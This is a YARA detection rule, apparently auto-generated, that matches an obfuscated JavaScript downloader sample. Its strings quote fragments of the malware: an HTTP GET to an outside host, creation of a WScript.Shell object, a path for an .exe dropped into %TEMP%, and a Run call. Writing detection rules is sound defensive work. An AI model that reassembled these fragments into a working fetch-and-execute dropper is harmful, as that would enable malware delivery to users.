rule sig_20160401_f6105b6dd76443c61f457f6ceacaeacd {
  meta:
    description = "datamaliciousorder - file 20160401_f6105b6dd76443c61f457f6ceacaeacd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a45f5e3ca9ef2e3d2fa0703130c39ba8f93870015676f1f226d5258f8053ac3f"

  strings:
    $s1  = "MogJjc[OttDyf](\"G\" + \"ET\", \"http://sirplusalot.org/p3owlk\", false);" fullword ascii
    $s2  = "function AplYy(ShsAql, KrbJe){EaYxh = EaYxh * 1; return ShsAql - KrbJe;};" fullword ascii
    $s3  = "var ZqOw = function SxnNu() {return WScript[BeWxm](\"WScript\"+\".Shell\");}(), TsBs = 11;" fullword ascii
    $s4  = "if (MogJjc[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function WdVhp(){return WpJzt + \"\";};" fullword ascii
    $s6  = "function PmpQb() {return ZqOw[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"MUYZwhZKLnxGPLa.ex\" + \"e\";};" fullword ascii
    $s7  = "function IhZv() {return ((YecJh == true) && (YecJh == QtsCb)) ? 1 : EaYxh;};" fullword ascii
    $s8  = "return AplYy(PnEvk, WkLmz);" fullword ascii
    $s9  = "function XrQdm(){return BeWxm;};" fullword ascii
    $s10 = "var ClBc = false;" fullword ascii
    $s11 = "}while (BeVsp);" fullword ascii
    $s12 = "var QtsCb = false;" fullword ascii
    $s13 = "var YecJh = false;" fullword ascii
    $s14 = "var EkMw = new this[\"Date\"]();" fullword ascii
    $s15 = "function VxZz(DaTnp) {var QpaBo = (1, 2, 3, 4, 5, DaTnp); return QpaBo;};" fullword ascii
    $s16 = "YecJh = true; " fullword ascii
    $s17 = "function EbZj(UqhWq){ZqOw[\"R\"+\"un\"](UqhWq, EaYxh, EaYxh);};" fullword ascii
    $s18 = "function FgpRp(){return 23;};" fullword ascii
    $s19 = "function ExmKw()" fullword ascii
    $s20 = "QtsCb = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}